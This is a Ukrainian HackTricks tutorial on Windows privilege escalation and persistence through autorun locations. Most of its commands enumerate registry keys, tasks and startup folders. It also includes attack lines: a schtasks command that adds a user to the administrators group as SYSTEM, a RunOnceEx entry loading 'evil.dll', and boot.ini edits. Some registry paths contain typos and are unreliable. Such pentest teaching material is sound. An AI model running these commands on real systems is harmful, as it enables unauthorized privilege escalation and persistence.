# Підвищення привілеїв за допомогою Autoruns

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Порада для баг-баунті**: **зареєструйтесь** на **Intigriti**, преміум **платформі для баг-баунті, створеній хакерами для хакерів**! Приєднуйтесь до нас на [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) сьогодні та почніть заробляти винагороди до **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## WMIC

**Wmic** можна використовувати для запуску програм при **завантаженні**. Дивіться, які бінарні файли заплановані для запуску при завантаженні за допомогою:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Заплановані завдання

**Завдання** можуть бути заплановані для виконання з **певною частотою**. Перегляньте, які бінарні файли заплановані для виконання за допомогою:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Папки

Усі бінарні файли, розташовані в **папках автозавантаження, будуть виконані під час запуску**. Загальні папки автозавантаження наведені далі, але папка автозавантаження вказується в реєстрі. [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Реєстр

> [!NOTE]
> [Примітка звідси](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Запис реєстру **Wow6432Node** вказує на те, що ви використовуєте 64-бітну версію Windows. Операційна система використовує цей ключ для відображення окремого вигляду HKEY_LOCAL_MACHINE\SOFTWARE для 32-бітних додатків, які працюють на 64-бітних версіях Windows.

### Запуски

**Загальновідомі** реєстрації AutoRun:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Ключі реєстру, відомі як **Run** і **RunOnce**, призначені для автоматичного виконання програм щоразу, коли користувач входить у систему. Командний рядок, призначений як значення даних ключа, обмежений 260 символами або менше.

**Запуски служб** (можуть контролювати автоматичний запуск служб під час завантаження):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

У Windows Vista та пізніших версіях ключі реєстру **Run** і **RunOnce** не генеруються автоматично. Записи в цих ключах можуть або безпосередньо запускати програми, або вказувати їх як залежності. Наприклад, щоб завантажити файл DLL під час входу в систему, можна використовувати ключ реєстру **RunOnceEx** разом з ключем "Depend". Це демонструється шляхом додавання запису реєстру для виконання "C:\temp\evil.dll" під час завантаження системи:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!NOTE]
> **Експлуатація 1**: Якщо ви можете записувати в будь-який з вказаних реєстрів всередині **HKLM**, ви можете підвищити привілеї, коли інший користувач входить в систему.

> [!NOTE]
> **Експлуатація 2**: Якщо ви можете перезаписати будь-який з бінарних файлів, вказаних у будь-якому з реєстрів всередині **HKLM**, ви можете модифікувати цей бінарний файл з бекдором, коли інший користувач входить в систему, і підвищити привілеї.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Ярлики, розміщені в папці **Startup**, автоматично запускають служби або програми під час входу користувача або перезавантаження системи. Місцезнаходження папки **Startup** визначається в реєстрі для обох областей **Local Machine** та **Current User**. Це означає, що будь-який ярлик, доданий до цих вказаних місць **Startup**, забезпечить запуск пов'язаної служби або програми після процесу входу або перезавантаження, що робить це простим методом для планування автоматичного запуску програм.

> [!NOTE]
> Якщо ви зможете перезаписати будь-яку \[User] Shell Folder під **HKLM**, ви зможете вказати її на папку, контрольовану вами, і розмістити бекдор, який буде виконуватись щоразу, коли користувач входить у систему, підвищуючи привілеї.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Зазвичай, ключ **Userinit** встановлений на **userinit.exe**. Однак, якщо цей ключ змінено, вказаний виконуваний файл також буде запущений **Winlogon** під час входу користувача. Аналогічно, ключ **Shell** призначений для вказівки на **explorer.exe**, який є стандартною оболонкою для Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!NOTE]
> Якщо ви можете перезаписати значення реєстру або двійковий файл, ви зможете підвищити привілеї.

### Налаштування політики

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Перевірте ключ **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Зміна командного рядка безпечного режиму

У реєстрі Windows за адресою `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` є значення **`AlternateShell`**, яке за замовчуванням встановлено на `cmd.exe`. Це означає, що коли ви вибираєте "Безпечний режим з командним рядком" під час завантаження (натискаючи F8), використовується `cmd.exe`. Але можливо налаштувати ваш комп'ютер на автоматичний старт у цьому режимі без необхідності натискати F8 і вручну вибирати його.

Кроки для створення параметра завантаження для автоматичного старту в "Безпечному режимі з командним рядком":

1. Змініть атрибути файлу `boot.ini`, щоб видалити прапори тільки для читання, системи та приховані: `attrib c:\boot.ini -r -s -h`
2. Відкрийте `boot.ini` для редагування.
3. Вставте рядок, наприклад: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Збережіть зміни у `boot.ini`.
5. Знову застосуйте оригінальні атрибути файлу: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Зміна ключа реєстру **AlternateShell** дозволяє налаштувати власну командну оболонку, що потенційно може призвести до несанкціонованого доступу.
- **Exploit 2 (Права на запис у PATH):** Наявність прав на запис у будь-яку частину системної змінної **PATH**, особливо перед `C:\Windows\system32`, дозволяє виконувати власний `cmd.exe`, що може бути бекдором, якщо система запуститься в безпечному режимі.
- **Exploit 3 (Права на запис у PATH та boot.ini):** Доступ до запису в `boot.ini` дозволяє автоматичний старт у безпечному режимі, що полегшує несанкціонований доступ при наступному перезавантаженні.

Щоб перевірити поточне налаштування **AlternateShell**, використовуйте ці команди:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Встановлений компонент

Active Setup - це функція в Windows, яка **ініціюється до повного завантаження робочого середовища**. Вона надає пріоритет виконанню певних команд, які повинні завершитися перед продовженням входу користувача. Цей процес відбувається навіть до того, як будуть активовані інші записи автозавантаження, такі як ті, що в розділах реєстру Run або RunOnce.

Active Setup керується через наступні ключі реєстру:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

У цих ключах існують різні підключі, кожен з яких відповідає конкретному компоненту. Ключові значення, які представляють особливий інтерес, включають:

- **IsInstalled:**
- `0` вказує, що команда компонента не буде виконана.
- `1` означає, що команда буде виконана один раз для кожного користувача, що є поведінкою за замовчуванням, якщо значення `IsInstalled` відсутнє.
- **StubPath:** Визначає команду, яка буде виконана Active Setup. Це може бути будь-яка дійсна командний рядок, наприклад, запуск `notepad`.

**Інсайти безпеки:**

- Модифікація або запис у ключ, де **`IsInstalled`** встановлено на `"1"` з конкретним **`StubPath`**, може призвести до несанкціонованого виконання команд, потенційно для підвищення привілеїв.
- Зміна бінарного файлу, на який посилається будь-яке значення **`StubPath`**, також може досягти підвищення привілеїв, за умови достатніх дозволів.

Щоб перевірити конфігурації **`StubPath`** в компонентах Active Setup, можна використовувати ці команди:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Огляд Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) — це модулі DLL, які додають додаткові функції до Internet Explorer від Microsoft. Вони завантажуються в Internet Explorer та Windows Explorer при кожному запуску. Однак їх виконання може бути заблоковане шляхом встановлення ключа **NoExplorer** на 1, що запобігає їх завантаженню з екземплярами Windows Explorer.

BHOs сумісні з Windows 10 через Internet Explorer 11, але не підтримуються в Microsoft Edge, браузері за замовчуванням у новіших версіях Windows.

Щоб дослідити BHOs, зареєстровані в системі, ви можете перевірити наступні ключі реєстру:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Кожен BHO представлений своїм **CLSID** у реєстрі, що слугує унікальним ідентифікатором. Докладну інформацію про кожен CLSID можна знайти під `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Для запиту BHOs у реєстрі можна використовувати ці команди:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Розширення Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Зверніть увагу, що реєстр міститиме 1 новий запис реєстру для кожного dll, і він буде представлений **CLSID**. Ви можете знайти інформацію про CLSID у `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Драйвери шрифтів

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Відкрити команду

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Варіанти виконання файлів зображень
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Зверніть увагу, що всі сайти, де ви можете знайти autoruns, **вже були перевірені**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Однак для **більш повного списку автоматично виконуваних** файлів ви можете використовувати [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) від sysinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Більше

**Знайдіть більше Autoruns, таких як реєстрації, в** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Посилання

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Порада з баг-баунті**: **зареєструйтесь** на **Intigriti**, преміум **платформі баг-баунті, створеній хакерами для хакерів**! Приєднуйтесь до нас на [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) сьогодні та почніть заробляти винагороди до **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
